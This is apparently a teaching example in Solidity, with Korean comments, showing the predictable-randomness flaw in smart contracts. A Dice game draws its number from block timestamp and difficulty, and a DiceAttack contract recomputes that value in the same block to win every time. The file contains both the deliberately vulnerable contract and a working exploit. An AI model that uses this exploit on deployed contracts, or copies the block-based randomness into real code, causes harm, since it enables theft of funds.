// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

// 랜덤한 값을 맟추는 사람이 우승자
contract Dice {
  constructor() payable {}

  receive() external payable {}

  address private winner;

  function roll(uint8 dice_number) public payable {
    uint8 dice = uint8(
      uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))) %
        251
    );
    if (dice_number == dice) {
      winner = msg.sender;
    }
  }

  function getWinner() public view returns (address) {
    return winner;
  }
}

interface IDice {
  function roll(uint8) external;
}

// keccak256, block.timestamp, block.difficulty 값은 사용자가 얻기 힘든값이다.
// 하지만 동일한 랜덤값으로 생성하는 컨트랙트를 만들어서 외부에서 호출하여 동작시키면 답 확인이 가능하다.
// 이는 같은 블록 네트워크 안에서는 같은 정보를 가지고 답을 생성하기 때문에 가능한 것이다.
contract DiceAttack {
  function attack(address _address) public payable {
    uint8 answer = uint8(
      uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))) %
        251
    );
    // EOA가 아닌 컨트랙트로 호출
    IDice(_address).roll(answer);
  }

  // 위너가 되었을 때 출금하기 위함
  function withdraw(address payable _to) public {
    _to.transfer(address(this).balance);
  }
}
